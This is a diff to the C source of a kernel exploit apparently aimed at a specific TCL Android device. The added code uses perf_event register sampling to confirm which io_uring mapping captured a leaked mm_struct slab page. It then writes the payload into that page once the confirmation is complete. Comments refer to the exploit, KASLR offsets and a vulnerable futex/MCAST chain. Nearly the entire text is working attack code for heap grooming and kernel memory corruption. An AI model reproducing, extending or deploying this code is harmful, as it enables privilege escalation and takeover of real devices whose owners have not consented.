@@ -1,8 +1,10 @@
 #include "common.h"
 #include "runtime_struct_offsets.h"
 #include "../devices/tcl_v643/capture_witness.h"
+#include "../devices/tcl_v643/io_uring_perf_witness.h"
 #include "kernelsnitch/kernelsnitch.h"
 #include <linux/io_uring.h>
+#include <linux/perf_event.h>
 
 static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
@@ -40,6 +42,7 @@ size_t uring_mapsz[URING_MAX];
  * 0x1000 for the MOVABLE-storm pseudo-mapping (0 = default 16KB). */
 size_t uring_mapstride[URING_MAX];
 int uring_count = 0;
+static int tcl_defer_uring_payload;
 long g_storm_block_start = -1;
 int g_tcl_capture_block = -1;
 int g_tcl_capture_status = TCL_CAPTURE_UNAVAILABLE;
@@ -158,11 +161,297 @@ int tcl_pagemap_pfn_preflight(uint64_t *head_pfn) {
   return visible;
 }
 
+enum tcl_perf_probe_kind {
+  TCL_PERF_PROBE_RING = 1,
+  TCL_PERF_PROBE_SQE = 2,
+};
+
+struct tcl_perf_probe_result {
+  unsigned samples;
+  unsigned own_samples;
+  unsigned site_samples;
+  unsigned target_hits;
+  unsigned near_samples;
+  unsigned pointer_samples;
+  uint64_t nearest_ip;
+  uint64_t nearest_delta;
+};
+
+#define TCL_PERF_DATA_PAGES 256U
+
+static uint64_t tcl_perf_ip_offset(const char *name, uint64_t def) {
+  const char *v = getenv(name);
+  if (!v || !*v) return def;
+  return strtoull(v, NULL, 0);
+}
+
+static void tcl_perf_pump_mmap(int map_index, int kind, int loops) {
+  size_t len = uring_mapsz[map_index];
+  int fd_index = kind == TCL_PERF_PROBE_RING ? map_index : map_index - 1;
+  off_t offset = kind == TCL_PERF_PROBE_RING ? IORING_OFF_SQ_RING
+                                             : IORING_OFF_SQES;
+  if (!len || fd_index < 0 || uring_fds[fd_index] < 0) return;
+  int ok = 0, last_errno = 0;
+  for (int i = 0; i < loops; i++) {
+    void *p = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED,
+                   uring_fds[fd_index], offset);
+    if (p != MAP_FAILED) {
+      ok++;
+      munmap(p, len);
+    } else {
+      last_errno = errno;
+    }
+  }
+  if (ok != loops)
+    pr_warning("TCL perf mmap pump: map=%d kind=%d ok=%d/%d len=%zx "
+               "off=%llx errno=%d\n", map_index, kind, ok, loops, len,
+               (unsigned long long)offset, last_errno);
+}
+
+/* Sample one exact instruction/register semantic.  Unlike a generic search
+ * for the target KVA, this cannot mistake an unrelated object that happened
+ * to reuse the old physical page: only ctx->rings at io_uring_poll or an
+ * address inside ctx->sq_sqes[index] at io_submit_sqes is accepted. */
+static int tcl_perf_probe_mapping_once(int map_index, int kind,
+                                       uintptr_t target,
+                                       unsigned long sample_period,
+                                       struct tcl_perf_probe_result *out) {
+  memset(out, 0, sizeof(*out));
+  out->nearest_delta = UINT64_MAX;
+  struct perf_event_attr pe;
+  memset(&pe, 0, sizeof(pe));
+  pe.type = PERF_TYPE_SOFTWARE;
+  pe.config = PERF_COUNT_SW_CPU_CLOCK;
+  pe.size = sizeof(pe);
+  pe.sample_period = sample_period;
+  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID |
+                   PERF_SAMPLE_REGS_INTR;
+  pe.sample_regs_intr = (UINT64_C(1) << 31) - 1;
+  pe.disabled = 1;
+  pe.exclude_user = 1;
+  pe.exclude_hv = 1;
+  pe.exclude_idle = 1;
+
+  int pfd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
+  if (pfd < 0) {
+    pr_warning("TCL perf witness: perf_event_open map=%d kind=%d errno=%d\n",
+               map_index, kind, errno);
+    return 0;
+  }
+  size_t map_sz = PAGE_SIZE * (1U + TCL_PERF_DATA_PAGES);
+  uint8_t *map = mmap(NULL, map_sz, PROT_READ | PROT_WRITE,
+                      MAP_SHARED, pfd, 0);
+  if (map == MAP_FAILED) {
+    pr_warning("TCL perf witness: perf mmap map=%d kind=%d errno=%d\n",
+               map_index, kind, errno);
+    close(pfd);
+    return 0;
+  }
+
+  int loops = env_int_range("TCL_PERF_RING_LOOPS", 20000, 1000, 200000);
+  ioctl(pfd, PERF_EVENT_IOC_RESET, 0);
+  ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0);
+  tcl_perf_pump_mmap(map_index, kind, loops);
+  ioctl(pfd, PERF_EVENT_IOC_DISABLE, 0);
+
+  struct perf_event_mmap_page *hdr = (void *)map;
+  uint64_t head = __atomic_load_n(&hdr->data_head, __ATOMIC_ACQUIRE);
+  uint64_t pos = hdr->data_tail;
+  uint8_t *data = map + PAGE_SIZE;
+  size_t data_sz = PAGE_SIZE * TCL_PERF_DATA_PAGES;
+  uint32_t own_tid = (uint32_t)syscall(__NR_gettid);
+  uint64_t ring_ip_off = tcl_perf_ip_offset(
+      "TCL_PERF_RING_IP_OFF", TCL_V643_PERF_RING_IP_OFF);
+  uint64_t sqe_ip_off = tcl_perf_ip_offset(
+      "TCL_PERF_SQE_IP_OFF", TCL_V643_PERF_SQE_IP_OFF);
+  uint64_t ring_ip_last_off = tcl_perf_ip_offset(
+      "TCL_PERF_RING_IP_LAST_OFF", TCL_V643_PERF_RING_IP_LAST_OFF);
+  uint64_t sqe_ip_last_off = tcl_perf_ip_offset(
+      "TCL_PERF_SQE_IP_LAST_OFF", TCL_V643_PERF_SQE_IP_LAST_OFF);
+  uint64_t text_anchor = tcl_perf_ip_offset(
+      "TCL_PERF_TEXT_ANCHOR",
+      active_offsets && active_offsets->kimage_text_base ?
+          active_offsets->kimage_text_base : KIMAGE_TEXT_BASE);
+  unsigned ring_reg = (unsigned)env_int_range(
+      "TCL_PERF_RING_REG", TCL_V643_PERF_RING_REG, 0, 30);
+  unsigned sqe_reg = (unsigned)env_int_range(
+      "TCL_PERF_SQE_REG", TCL_V643_PERF_SQE_REG, 0, 30);
+
+  while (pos < head) {
+    size_t at = (size_t)(pos % data_sz);
+    struct perf_event_header eh;
+    if (at + sizeof(eh) <= data_sz) {
+      memcpy(&eh, data + at, sizeof(eh));
+    } else {
+      size_t first = data_sz - at;
+      memcpy(&eh, data + at, first);
+      memcpy((uint8_t *)&eh + first, data, sizeof(eh) - first);
+    }
+    if (eh.size < sizeof(eh) || eh.size > 4096) break;
+    uint8_t record[4096];
+    if (at + eh.size <= data_sz) {
+      memcpy(record, data + at, eh.size);
+    } else {
+      size_t first = data_sz - at;
+      memcpy(record, data + at, first);
+      memcpy(record + first, data, eh.size - first);
+    }
+    if (eh.type == PERF_RECORD_SAMPLE) {
+      uint8_t *p = record + sizeof(eh);
+      uint64_t ip, abi;
+      uint32_t pid, tid;
+      memcpy(&ip, p, 8); p += 8;
+      memcpy(&pid, p, 4); memcpy(&tid, p + 4, 4); p += 8;
+      (void)pid;
+      out->samples++;
+      if (tid == own_tid) {
+        out->own_samples++;
+        memcpy(&abi, p, 8); p += 8;
+        if (abi == PERF_SAMPLE_REGS_ABI_64 ||
+            abi == PERF_SAMPLE_REGS_ABI_32) {
+          const uint64_t *regs = (const uint64_t *)p;
+          uint64_t expected_ip = text_anchor +
+              (kind == TCL_PERF_PROBE_RING ? ring_ip_off : sqe_ip_off);
+          uint64_t delta = ip > expected_ip ? ip - expected_ip
+                                             : expected_ip - ip;
+          if (delta < out->nearest_delta) {
+            out->nearest_delta = delta;
+            out->nearest_ip = ip;
+          }
+          if (delta <= UINT64_C(0x100)) out->near_samples++;
+          if ((kind == TCL_PERF_PROBE_RING &&
+               regs[ring_reg] == target) ||
+              (kind == TCL_PERF_PROBE_SQE &&
+               regs[sqe_reg] == target))
+            out->pointer_samples++;
+          uint64_t expected_last_ip = text_anchor +
+              (kind == TCL_PERF_PROBE_RING ? ring_ip_last_off
+                                           : sqe_ip_last_off);
+          if (ip >= expected_ip && ip <= expected_last_ip && !(ip & 3)) {
+            out->site_samples++;
+            if ((kind == TCL_PERF_PROBE_RING &&
+                 tcl_v643_perf_ring_sample(ip, regs, text_anchor, target,
+                                           ring_ip_off, ring_ip_last_off,
+                                           ring_reg)) ||
+                (kind == TCL_PERF_PROBE_SQE &&
+                 tcl_v643_perf_sqe_sample(ip, regs, text_anchor, target,
+                                          sqe_ip_off, sqe_ip_last_off,
+                                          sqe_reg)))
+              out->target_hits++;
+          }
+        }
+      }
+    }
+    pos += eh.size;
+  }
+  hdr->data_tail = head;
+  munmap(map, map_sz);
+  close(pfd);
+  return 1;
+}
+
+static void tcl_perf_merge_result(struct tcl_perf_probe_result *dst,
+                                  const struct tcl_perf_probe_result *src) {
+  dst->samples += src->samples;
+  dst->own_samples += src->own_samples;
+  dst->site_samples += src->site_samples;
+  dst->target_hits += src->target_hits;
+  dst->near_samples += src->near_samples;
+  dst->pointer_samples += src->pointer_samples;
+  if (src->nearest_delta < dst->nearest_delta) {
+    dst->nearest_delta = src->nearest_delta;
+    dst->nearest_ip = src->nearest_ip;
+  }
+}
+
+/* Software CPU-clock sampling can phase-lock to a tight syscall loop under
+ * emulation.  Accumulate several mutually-prime periods, stopping as soon as
+ * the exact semantic window has enough observations.  Missing observations
+ * remain a hard failure; retries never turn a pointer-only sighting into
+ * proof. */
+static int tcl_perf_probe_mapping(int map_index, int kind,
+                                  uintptr_t target,
+                                  struct tcl_perf_probe_result *out) {
+  static const unsigned long periods[] = {1000, 997, 1009, 983, 1021};
+  int min_hits = env_int_range("TCL_PERF_WITNESS_MIN_HITS",
+                               TCL_V643_PERF_MIN_HITS, 2, 1000);
+  int attempts = env_int_range("TCL_PERF_WITNESS_ATTEMPTS", 5, 1,
+                               (int)(sizeof(periods) / sizeof(periods[0])));
+  memset(out, 0, sizeof(*out));
+  out->nearest_delta = UINT64_MAX;
+  int opened = 0;
+  for (int i = 0; i < attempts && out->site_samples < (unsigned)min_hits;
+       i++) {
+    struct tcl_perf_probe_result one;
+    if (!tcl_perf_probe_mapping_once(map_index, kind, target, periods[i],
+                                     &one))
+      continue;
+    opened = 1;
+    tcl_perf_merge_result(out, &one);
+  }
+  return opened;
+}
+
+static int tcl_perf_capture_witness(uintptr_t target, int *hit_block) {
+  if (!kaslr_done || !target || uring_count < 2) return 0;
+  int min_hits = env_int_range("TCL_PERF_WITNESS_MIN_HITS",
+                               TCL_V643_PERF_MIN_HITS, 2, 1000);
+  int matches = 0;
+  int found = -1;
+  int complete = 1;
+  for (int m = 0; m + 1 < uring_count; m += 2) {
+    struct tcl_perf_probe_result ring = {0}, sqe = {0};
+    int ring_ok = tcl_perf_probe_mapping(
+        m, TCL_PERF_PROBE_RING, target, &ring);
+    int sqe_ok = tcl_perf_probe_mapping(
+        m + 1, TCL_PERF_PROBE_SQE, target, &sqe);
+    pr_info("TCL perf witness: pair=%d "
+            "ring=%u/%u near=%u ptr=%u nearest=%llx+%llx site=%u hit=%u "
+            "sqe=%u/%u near=%u ptr=%u nearest=%llx+%llx site=%u hit=%u\n",
+            m / 2, ring.own_samples, ring.samples,
+            ring.near_samples, ring.pointer_samples,
+            (unsigned long long)ring.nearest_ip,
+            (unsigned long long)ring.nearest_delta,
+            ring.site_samples, ring.target_hits,
+            sqe.own_samples, sqe.samples,
+            sqe.near_samples, sqe.pointer_samples,
+            (unsigned long long)sqe.nearest_ip,
+            (unsigned long long)sqe.nearest_delta,
+            sqe.site_samples, sqe.target_hits);
+    if (!ring_ok || !sqe_ok || ring.site_samples < (unsigned)min_hits ||
+        sqe.site_samples < (unsigned)min_hits) {
+      complete = 0;
+      continue;
+    }
+    /* At an exact semantic site every sample must agree. Partial agreement
+     * is treated as ambiguity, never as a weak positive. */
+    if (ring.target_hits && ring.target_hits != ring.site_samples)
+      complete = 0;
+    if (sqe.target_hits && sqe.target_hits != sqe.site_samples)
+      complete = 0;
+    if (ring.target_hits == ring.site_samples) {
+      matches++;
+      found = m;
+    }
+    if (sqe.target_hits == sqe.site_samples) {
+      matches++;
+      found = m + 1;
+    }
+  }
+  if (!complete || matches != 1) {
+    pr_warning("TCL perf witness: complete=%d semantic_matches=%d; "
+               "capture unproved\n", complete, matches);
+    return 0;
+  }
+  *hit_block = found;
+  return 1;
+}
+
 /* Prove that one, and only one, tracked io_uring mapping owns the leaked
- * mm_struct slab.  The QEMU observer is used only in the instrumented VM.
- * On a real device the standard pagemap ABI is attempted; modern kernels
- * normally mask PFNs for the shell, in which case the verdict is UNKNOWN and
- * the exploit stops before creating the vulnerable futex/MCAST chain. */
+ * mm_struct slab.  Prefer a real PFN comparison when QEMU instrumentation or
+ * pagemap provides it.  Stock Android masks pagemap PFNs, so the optional
+ * second witness samples two exact V643 instructions where registers have
+ * proven semantics: ctx->rings and ctx->sq_sqes[index]. */
 static int tcl_capture_witness(uintptr_t slab_kva) {
   uint64_t target_pfn = tcl_target_head_pfn(
       slab_kva, active_offsets->page_offset, active_offsets->phys_offset,
@@ -216,14 +505,47 @@ static int tcl_capture_witness(uintptr_t slab_kva) {
   }
   if (target_pfn == UINT64_MAX)
     visible = 0;
-  g_tcl_capture_status = tcl_capture_verdict(total, visible, hits);
-  g_tcl_capture_block =
-      g_tcl_capture_status == TCL_CAPTURE_CONFIRMED ? hit_block : -1;
+  int pfn_status = tcl_capture_verdict(total, visible, hits);
   pr_info("TCL capture witness: method=%s visible=%u/%u hits=%u block=%d "
           "target_pfn=%llx verdict=%d\n",
-          g_tcl_capture_method, visible, total, hits, g_tcl_capture_block,
-          (unsigned long long)target_pfn, g_tcl_capture_status);
-  return g_tcl_capture_status == TCL_CAPTURE_CONFIRMED;
+          g_tcl_capture_method, visible, total, hits,
+          pfn_status == TCL_CAPTURE_CONFIRMED ? hit_block : -1,
+          (unsigned long long)target_pfn, pfn_status);
+
+  int force_perf = env_flag("TCL_CAPTURE_FORCE_PERF", 0);
+  int enable_perf = force_perf || env_flag("TCL_PERF_WITNESS", 0) ||
+                    env_flag("TCL_PERF_WITNESS_DIAG_ONLY", 0);
+  if (pfn_status == TCL_CAPTURE_CONFIRMED && !force_perf) {
+    g_tcl_capture_status = pfn_status;
+    g_tcl_capture_block = hit_block;
+    return 1;
+  }
+
+  if (enable_perf) {
+    int perf_block = -1;
+    int perf_ok = tcl_perf_capture_witness(slab_kva, &perf_block);
+    if (perf_ok && pfn_status == TCL_CAPTURE_CONFIRMED &&
+        perf_block != hit_block) {
+      pr_warning("TCL perf witness disagrees with PFN witness: perf=%d "
+                 "pfn=%d\n", perf_block, hit_block);
+      perf_ok = 0;
+    }
+    pr_info("TCL capture witness: method=perf-regs target=%016zx "
+            "block=%d pfn_reference=%d verdict=%d\n",
+            slab_kva, perf_ok ? perf_block : -1,
+            pfn_status == TCL_CAPTURE_CONFIRMED ? hit_block : -1,
+            perf_ok ? TCL_CAPTURE_CONFIRMED : TCL_CAPTURE_UNAVAILABLE);
+    if (perf_ok && !env_flag("TCL_PERF_WITNESS_DIAG_ONLY", 0)) {
+      g_tcl_capture_method = "perf-regs";
+      g_tcl_capture_status = TCL_CAPTURE_CONFIRMED;
+      g_tcl_capture_block = perf_block;
+      return 1;
+    }
+  }
+
+  g_tcl_capture_status = pfn_status;
+  g_tcl_capture_block = -1;
+  return 0;
 }
 
 uintptr_t page_base;
@@ -1235,13 +1557,19 @@ static int reclaim_one_uring_size(int tag, unsigned entries) {
             hdr_ok ? "OK" : "BAD (not a rings page)",
             (size_t)nz_off, (unsigned long long)nz_val);
   }
-  payload_into_mapping(rings, rings_sz);
-  payload_into_mapping(sqes, sqes_sz);
+  /* The PFN-free TCL witness must inspect the live io_uring pointer
+   * semantics while the ring metadata and SQEs are still valid.  Other
+   * reclaim routes retain the historical immediate payload behavior. */
+  if (!tcl_defer_uring_payload) {
+    payload_into_mapping(rings, rings_sz);
+    payload_into_mapping(sqes, sqes_sz);
+  }
   if (uring_count + 2 <= URING_MAX) {
     uring_fds[uring_count] = fd;
     uring_maps[uring_count] = rings;
     uring_mapsz[uring_count] = rings_sz;
     uring_count++;
+    uring_fds[uring_count] = -1;
     uring_maps[uring_count] = sqes;
     uring_mapsz[uring_count] = sqes_sz;
     uring_count++;
@@ -1274,6 +1602,7 @@ static void tcl_release_urings(void) {
   uring_count = 0;
   uring_fd = -1;
   uring_sqes = NULL;
+  tcl_defer_uring_payload = 0;
 }
 
 static void tcl_cleanup_ctx(void) {
@@ -1435,6 +1764,7 @@ static uintptr_t prepare_kernel_page_tcl(int payload_mode) {
   /* Each first free adds one pobject.  The fifth drain is the measured
    * V643 discard point, but retain all eight interleaved ring pairs so the
    * route tolerates a pre-existing CPU-partial phase without guessing it. */
+  tcl_defer_uring_payload = 1;
   for (int drain = 1; drain <= 8; drain++) {
     size_t pos = target_window_end + 1 + (size_t)(drain - 1) * 16;
     if (!tcl_release_mm_position(pos)) goto fail;
@@ -1449,6 +1779,12 @@ static uintptr_t prepare_kernel_page_tcl(int payload_mode) {
     errno = ENODATA;
     goto fail;
   }
+  /* The exact mapping is now proven.  Materialize the payload only after
+   * all PFN/perf observations are complete; this intentionally invalidates
+   * the ordinary ring metadata, so no later io_uring operation is allowed. */
+  for (int m = 0; m < uring_count && m < URING_MAX; m++)
+    payload_into_mapping(uring_maps[m], uring_mapsz[m]);
+  tcl_defer_uring_payload = 0;
   kernelsnitch_cleanup(ks);
   ks = NULL;
   pr_info("TCL reclaim: exact ballast/target/drain complete, mappings=%d\n",
